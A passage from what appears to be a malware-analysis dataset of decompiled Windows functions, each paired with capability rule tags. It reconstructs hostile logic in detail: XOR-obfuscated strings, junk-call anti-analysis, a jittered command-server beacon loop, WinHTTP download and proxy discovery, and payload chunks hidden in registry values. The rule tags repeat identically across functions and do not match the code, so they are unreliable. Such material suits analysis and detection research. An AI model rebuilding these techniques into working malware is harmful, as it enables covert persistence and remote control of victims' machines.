(*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_4ch;\n            iVar6 = var_fch;\n        }\n        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar3, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar3, 0),  iVar2 == 0))\n        goto code_r0x00403102;\n        lpdwBufferLength = 4;\n        var_f8h = 0;\n        var_f4h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000005, 0, &var_f8h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f8h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000013, 0, &var_f4h, &lpdwBufferLength, 0);\n        if ((var_f4h == 0xce) || (var_f4h == 200)) {\n            if (var_48h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f8h);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_48h = 0;\n                var_48h[1] = iVar2;\n            }\n            arg_18h = var_48h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar3, &lpdwNumberOfBytesAvailable);\n                if ((iVar2 == 0) ||\n                   (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar3, *var_48h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar2 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x00403108;\n                }\n                *var_48h = *var_48h + lpdwNumberOfBytesRead;\n                iVar2 = *var_48h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar2;\n            if ((*arg_10h == 0) || (iVar2 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x00403108:\n    if (puVar3 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar3);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x00403128:\n    uVar1 = lpdwNumberOfBytesAvailable;\n    uVar4 = (*pcVar8)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return uVar1;\n}\n",
        "token_count": 4796
    },
    "00403199": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00403199(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41cd20;\n    var_44h = 0xb2d2428;\n    var_40h = 0x26212f31;\n    var_3ch = 0x2a223e06;\n    var_38h = 0x393b0123;\n    var_34h = 0x201c3c37;\n    var_30h = 0x1739303c;\n    var_2ch = 0x6368332d;\n    var_28h = 0x757b6530;\n    var_24h = 0x7e625a7a;\n    var_20h = 0x545f777e;\n    var_14h = 0x6f4e4649;\n    var_10h._0_1_ = 0x54;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar5 != 0x8c1822) {\n            var_4h = 5;\n            pcVar4[iVar7] = *(&var_14h + iVar7 % 5) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = str.QT_Y___;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x00403285;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x00403285:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.0040b964();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x412140);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 983
    },
    "00403300": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403300(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.0040ea7f(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x00403369;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x00403369:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.QT_Y___;\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.QT_Y___;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, str.QT_Y___ + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x412120);\n        }\n        fcn.0040482b();\n        *0x41caa8 = var_ch;\n        pcVar4 = 0x1;\n        *0x41caac = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 762
    },
    "004033f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004034bc)\n// WARNING: Removing unreachable block (ram,0x004034d7)\n// WARNING: Removing unreachable block (ram,0x004034de)\n// WARNING: Removing unreachable block (ram,0x004034e5)\n// WARNING: Removing unreachable block (ram,0x004034fe)\n\nuint __cdecl fcn.004033f3(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41caa8;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.00404521();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cda0);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.00403e17();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.00403300(0),  iVar2 != 0)) {\n        fcn.0040482b();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cda0);\n    }\n    while (*0x41caa0 == 0) {\n        iVar2 = fcn.00403199();\n        if (iVar2 != -1) {\n            fcn.0040b9e6();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 500
    },
    "004035a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004035a5(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.00403551(),  iVar6 != 0)) {\n        uVar8 = 1;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar6 != 0)) {\n            bVar10 = pProxyConfig != 0;\n            var_50h = 0;\n            uStack80 = 0;\n            uStack76 = 0;\n            var_54h = bVar10;\n            pAutoProxyOptions = bVar10;\n            if (var_38h != 0) {\n                pAutoProxyOptions = bVar10 | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar6, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x0040389b;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x0040371b:\n                iVar6 = var_34h;\n                iVar7 = fcn.0040414c();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar7 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x0040389b;\n                }\n                pProxyInfo = 0x3817415c;\n                psz2 = 0x41444c41;\n                var_8h = 0x4c0f3810;\n                var_4h._0_2_ = 0x4134;\n                var_1ch = 0x38634134;\n                var_18h._0_2_ = 0x4c35;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar6;\n                var_40h = 6;\n                pszSrch = iVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                    if (iVar7 != 0x7447c9) {\n                        *(var_14h + iVar6) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar6)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x7a15772a;\n                psz2 = 0x77325a20;\n                var_8h = 0x5a547a12;\n                var_1ch = 0x7a617742;\n                var_18h._0_2_ = 0x5a54;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar7 = 0;\n                var_28h = &pProxyInfo - iVar6;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0xead580) {\n                        *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_40h) ^ (iVar7 + iVar6)[&pProxyInfo - iVar6];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar7 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.00404172(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                    if ((pszSrch == (iVar7 == lpcwszUrl)) && (iVar7 = fcn.0040414c(),  iVar7 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar5);\n                        goto code_r0x0040389b;\n                    }\n                    lpcwszUrl = fcn.00404172(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.00404172(&var_14h);\n                    if (iVar6 == 0) goto code_r0x0040371b;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x0040389b:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2240
    },
    "00403adc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00403adc(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    uint32_t var_50h;\n    int32_t hKey;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = var_28h & 0xffffff00;\n    var_54h = param_1;\n    var_24h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_5ch = uVar2;\n        fcn.00403950();\n        hKey = fcn.004038f7(0x20006);\n        if (hKey != 0) {\n            var_48h = *param_1;\n            var_44h = 0x59204b35;\n            var_40h = 0x492a575b;\n            var_3ch = 0x4b2e352b;\n            var_38h = 0x57585900;\n            var_34h = 0x353e492a;\n            var_30h = 0x596c4b32;\n            var_50h = (((var_48h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_2ch = 0x494b5751;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x59494b57;\n            var_4h._0_1_ = 0x35;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_58h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar3 != 0x3005c) {\n                    var_14h = 5;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_44h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_24h);\n            var_8h = 0;\n            var_20h = 0x4c1c3813;\n            var_1ch = 0x38134d0d;\n            var_18h = 0x4d524c0b;\n            var_10h = 0x4c6f3836;\n            var_ch._0_2_ = 0x4d52;\n            var_24h = 6;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_14h = &var_20h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                    if (iVar3 != 0x3f731e) {\n                        *(iVar6 + iVar4) = *(&var_10h + iVar6 % var_24h) ^ (iVar6 + iVar4)[&var_20h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_8h,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_8h);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_8h = iVar3 + 1;\n            } while (var_8h < 0x32);\n            var_14h = 0;\n            if (0 < var_50h) {\n                var_8h = 0;\n                var_20h = 0x4c1c3813;\n                var_1ch = 0x38134d0d;\n                var_18h = 0x4d524c0b;\n                var_10h = 0x4c6f3836;\n                var_ch._0_2_ = 0x4d52;\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_28h = &var_20h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                        if (iVar3 != 0x3f731e) {\n                            *(iVar6 + iVar4) = *(&var_10h + iVar6 % var_24h) ^ (iVar6 + iVar4)[&var_20h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_14h,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_14h);\n                    iVar6 = 0x7d000;\n                    if (var_48h < 0x7d000) {\n                        iVar6 = var_48h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_54h[1] + var_8h, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_28h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_14h = iVar3 + 1;\n                    var_8h = var_8h + 0x7d000;\n                    var_48h = var_48h + -0x7d000;\n                } while (var_14h < var_50h);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_58h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_5ch;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_28h & 0xff;\n}\n",
        "token_count": 2151
    },
    "00403e17": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403e17(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uchar *var_64h;\n    uchar *var_60h;\n    int32_t *var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *lpcbData;\n    int32_t lpType;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_5ch = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_58h = iVar3;\n        fcn.00403950();\n        var_6ch = fcn.004038f7(0x20019);\n        if (var_6ch != 0) {\n            var_54h = 0;\n            var_48h = 0x59204b35;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_44h = 0x492a575b;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x4b2e352b;\n            var_3ch = 0x57585900;\n            var_38h = 0x353e492a;\n            var_34h = 0x596c4b32;\n            var_30h = 0x494b5751;\n            var_20h = 0x59494b57;\n            var_1ch = CONCAT31(var_1ch._1_3_, 0x35);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_70h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar4 != 0x3005c) {\n                    hKey = 5;\n                    *(iVar8 + iVar3) = *(&var_20h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_48h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, lpType);\n            var_2ch = 0x4c1c3813;\n            var_28h = 0x38134d0d;\n            var_24h = 0x4d524c0b;\n            var_18h = 0x4c6f3836;\n            var_14h._0_2_ = 0x4d52;\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_20h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                